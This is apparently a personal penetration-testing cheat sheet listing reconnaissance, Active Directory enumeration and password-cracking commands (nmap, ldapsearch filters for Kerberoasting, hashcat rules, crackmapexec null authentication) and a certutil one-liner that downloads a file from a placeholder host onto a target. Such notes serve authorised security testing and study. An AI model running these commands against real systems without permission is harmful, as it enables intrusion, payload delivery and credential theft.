# Useful Commands/Scripts #

## Reconnaisance ##

### Nmap ###

- Quick scan: `nmap -v -sC -sS -oA [filename] [host]`
- Full scan: `nmap -v -p- -oA [filename] [host]`

### NSLookup ###

- Set DNS server:
  - `server [host]`
- Lookup host
  - `[host]`
  - Works for reverse lookups, too

### LDAPSearch ###
- `-x` sets simple (non-binding) authentication
- `-h` sets the LDAP server
- `-s` is the scope (`sub`, `base`, `one`, or `children`)
- Anything put at the end will be interpreted as a list of attributes to return

#### LDAP Filters of Note ####

- `&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)` finds human users with SPNs (for Kerberoasting attacks)
- `&(objectCategory=person)(objectClass=user)` returns human users
- `(objectClass=group)` returns groups

## Cracking ##

- `hashcat --stdout [basic password list] -r [ruleset] -r [ruleset 2] ...` will enrich a basic wordlist by applying the given rules. Good for making a small list with variations on common passwords, for use in online attacks.
- `crackmapexec smb --pas-pol` can enumerate password policies via SMB; useful for further refining your wordlists (e.g. restricting passwords in the list to those with a length that is valid in the password policy)
  - you may need to append `-u '' -p ''` for a null authentication attack, if the anonymous authentication did not work
  - Both will fail if the server is properly configured though (i.e. prevents null- and anonymous-authentication)
  - Similar things can be done via `rpcclient`, too.

## Downloading Items to Target ##

- Certutil: `certutil.exe -urlcache -split -f "hxxp://place.com/something" something`

## Running .NET stuff without .NET access locally ##

- https://dotnetfiddle.net

## Generic network connections ##

- I prefer to start by trying with `nc`
- If `nc` runs into issues, I use `telnet`
